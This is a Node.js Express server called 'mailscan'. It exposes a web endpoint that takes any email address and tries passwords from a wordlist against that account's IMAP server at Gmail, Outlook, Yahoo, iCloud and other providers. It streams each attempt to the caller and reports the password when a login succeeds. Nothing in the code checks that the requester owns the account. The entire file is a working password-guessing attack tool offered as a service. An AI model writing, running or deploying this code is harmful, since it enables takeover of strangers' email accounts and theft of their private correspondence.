const express = require("express");
const path = require("path");
const fs = require("fs");
const { ImapFlow } = require("imapflow");

const app = express();
const PORT = process.env.PORT || 3000;
const TIMEOUT = 9000;
const CONCURRENCY = 2;
const GAP = 150;
const MAX_LIMIT = 500;

const WORDLIST = fs
  .readFileSync(path.join(__dirname, "wordlist.txt"), "utf8")
  .split(/\r?\n/)
  .map(s => s.trim())
  .filter(s => s && !s.startsWith("#"));

const HOSTS = {
  "gmail.com": "imap.gmail.com",
  "googlemail.com": "imap.gmail.com",
  "outlook.com": "outlook.office365.com",
  "hotmail.com": "outlook.office365.com",
  "live.com": "outlook.office365.com",
  "msn.com": "outlook.office365.com",
  "yahoo.com": "imap.mail.yahoo.com",
  "ymail.com": "imap.mail.yahoo.com",
  "aol.com": "imap.aol.com",
  "icloud.com": "imap.mail.me.com",
  "me.com": "imap.mail.me.com",
  "gmx.com": "imap.gmx.com",
  "gmx.net": "imap.gmx.net",
  "zoho.com": "imap.zoho.com",
  "fastmail.com": "imap.fastmail.com",
  "yandex.com": "imap.yandex.com",
  "mail.ru": "imap.mail.ru"
};

const sleep = ms => new Promise(r => setTimeout(r, ms));

function hostFor(email, override) {
  if (override) return override;
  const d = email.split("@")[1] || "";
  return HOSTS[d] || "imap." + d;
}

async function tryLogin(email, pass, host) {
  const c = new ImapFlow({
    host, port: 993, secure: true,
    auth: { user: email, pass },
    logger: false,
    tls: { rejectUnauthorized: false },
    connectionTimeout: TIMEOUT,
    greetingTimeout: TIMEOUT,
    socketTimeout: TIMEOUT,
    authTimeout: TIMEOUT
  });
  try {
    await c.connect();
    try { await c.logout(); } catch (_) {}
    return true;
  } catch (e) {
    try { await c.close(); } catch (_) {}
    return false;
  }
}

const hits = new Map();
function rateLimit(ip) {
  const now = Date.now();
  const arr = (hits.get(ip) || []).filter(t => now - t < 10 * 60 * 1000);
  arr.push(now);
  hits.set(ip, arr);
  return arr.length <= 4;
}

app.use(express.static(path.join(__dirname, "public")));

app.get("/api/scan", async (req, res) => {
  const email = String(req.query.email || "").trim().toLowerCase();
  const hostOverride = String(req.query.host || "").trim();
  let limit = parseInt(req.query.limit, 10) || 100;
  limit = Math.max(1, Math.min(MAX_LIMIT, limit));

  res.writeHead(200, {
    "Content-Type": "text/event-stream",
    "Cache-Control": "no-cache, no-transform",
    Connection: "keep-alive",
    "X-Accel-Buffering": "no"
  });

  const send = o => res.write("data: " + JSON.stringify(o) + "\n\n");

  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
    send({ type: "error", msg: "Invalid email address" });
    return res.end();
  }

  const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress;
  if (!rateLimit(ip)) {
    send({ type: "error", msg: "Rate limit: 4 scans per 10 minutes" });
    return res.end();
  }

  const host = hostFor(email, hostOverride);
  const queue = WORDLIST.slice(0, limit);
  let idx = 0, attempts = 0, hit = null, aborted = false;
  const t0 = Date.now();

  req.on("close", () => { aborted = true; });
  send({ type: "start", host, total: queue.length });

  async function worker() {
    while (!hit && !aborted) {
      const i = idx++;
      if (i >= queue.length) return;
      const pass = queue[i];
      attempts++;
      send({ type: "try", pass, n: attempts });
      const ok = await tryLogin(email, pass, host);
      if (aborted) return;
      if (ok) {
        hit = pass;
        send({ type: "hit", pass, n: attempts, ms: Date.now() - t0 });
        return;
      }
      send({ type: "miss", pass });
      await sleep(GAP);
    }
  }

  await Promise.all(Array.from({ length: CONCURRENCY }, worker));
  if (!aborted && !hit) send({ type: "done", n: attempts, ms: Date.now() - t0 });
  res.end();
});

app.listen(PORT, () => console.log("mailscan on " + PORT));
